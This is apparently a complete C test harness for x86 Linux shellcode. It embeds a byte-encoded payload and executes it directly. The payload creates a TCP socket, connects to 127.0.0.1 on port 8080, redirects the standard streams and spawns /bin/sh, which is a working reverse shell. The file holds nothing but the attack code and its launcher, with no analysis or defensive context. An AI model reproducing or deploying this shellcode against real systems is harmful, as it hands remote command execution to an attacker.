#include <stdio.h>
#include <string.h>

unsigned char code[] = "\xde\xde\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x97\x31\xc9\xb9\x80\xff\xff\xfe\x83\xf1\xff\x51\x66\x68\x1f\x90\x66\x6a\x02\x89\xe1\x6a\x10\x5a\x89\xfb\x66\xb8\x6a\x01\xcd\x80\x6a\x03\x59\x89\xfb\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xdb\x31\xc9\x31\xd2\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

void main(void)
{
        printf("Shellcode Length:  %d\n", strlen(code));
        (*(void(*)()) code)();
}